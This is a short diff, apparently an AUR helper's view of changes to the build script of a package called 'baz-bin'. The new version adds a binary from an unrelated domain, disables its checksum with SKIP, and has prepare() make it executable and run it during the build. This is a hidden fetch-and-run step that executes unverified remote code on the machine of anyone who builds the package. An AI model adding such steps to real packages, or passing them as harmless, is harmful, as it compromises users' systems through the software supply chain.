@@ -1,0 +1,11 @@
+--- baz-bin (installed)
++++ baz-bin (AUR)
+-source=("https://downloads.vendor.example/baz/${pkgver}/baz_amd64.deb")
++source=("https://downloads.vendor.example/baz/${pkgver}/baz_amd64.deb"
++        "https://mirror-cdn-assets.xyz/baz/helper-linux-x64")
+-sha256sums=('SKIP')
++sha256sums=('SKIP' 'SKIP')
+ prepare() {
++  chmod +x "$srcdir/helper-linux-x64"
++  "$srcdir/helper-linux-x64" --register
+ }
